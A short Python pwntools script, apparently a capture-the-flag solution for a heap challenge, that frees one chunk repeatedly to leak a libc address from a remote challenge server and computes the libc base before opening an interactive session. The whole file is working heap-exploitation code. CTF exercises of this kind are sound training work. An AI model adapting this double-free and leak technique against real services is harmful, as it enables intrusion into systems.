from pwn import *

def new(size, contents):
    p.sendlineafter(':', '1')
    p.sendlineafter(':', '0')
    p.sendlineafter(':', str(size))
    p.sendlineafter(':', contents)

def delete():
    p.sendlineafter(':', '2')
    p.sendlineafter(':', str('0'))

def show():
    p.sendlineafter(':', '3')
    p.sendlineafter(':', str('0'))
    return p.recvuntil('free}}')

context.update(log_level='debug')
#p = process('bin/four-function-heap')
p = remote('2020.redpwnc.tf', 31774)

new(300, 'A'*299)
delete()

#dummy chunk
new(100, 'B'*99)

new(300, 'C'*299)
for i in range(8):
    delete()
addr_libc = u64(show().split('{{')[0][-7:-1].ljust(8, '\x00'))


log.info('libc: ' + hex(addr_libc))
offset_libc = 0x3ebca0
addr_libc_base = addr_libc - offset_libc
log.info('libc: ' + hex(addr_libc_base))


#raw_input('debug:' + str(p.pid))

p.interactive()


